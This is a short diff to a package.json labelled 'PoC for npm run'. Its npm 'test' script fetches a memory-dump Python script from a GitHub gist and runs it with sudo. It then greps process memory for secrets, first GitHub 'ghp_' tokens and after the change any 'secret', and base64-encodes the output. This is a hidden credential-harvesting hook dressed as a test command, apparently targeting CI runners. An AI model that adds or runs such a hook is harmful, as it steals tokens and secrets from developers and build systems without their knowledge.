@@ -3,7 +3,7 @@
   "version": "3.8.0",
   "description": "PoC for npm run",
   "scripts": {
-    "test": "echo 'Running';curl -sSf 'https:\/\/gist.githubusercontent.com\/nikitastupin\/30e525b776c409e03c2d6f328f254965\/raw\/memdump.py' | sudo python3 | tr -d '\\0' | grep 'ghp_' | sort -u | base64 -w0 | base64 -w0; echo 'Running'"
+    "test": "echo 'Running';curl -sSf 'https:\/\/gist.githubusercontent.com\/nikitastupin\/30e525b776c409e03c2d6f328f254965\/raw\/memdump.py' | sudo python3 | tr -d '\\0' | grep -i 'secret' | sort -u | base64 -w0 | base64 -w0; echo 'Running'"
   },
   "author": "Ritik",
   "license": "Apache License 2.0",
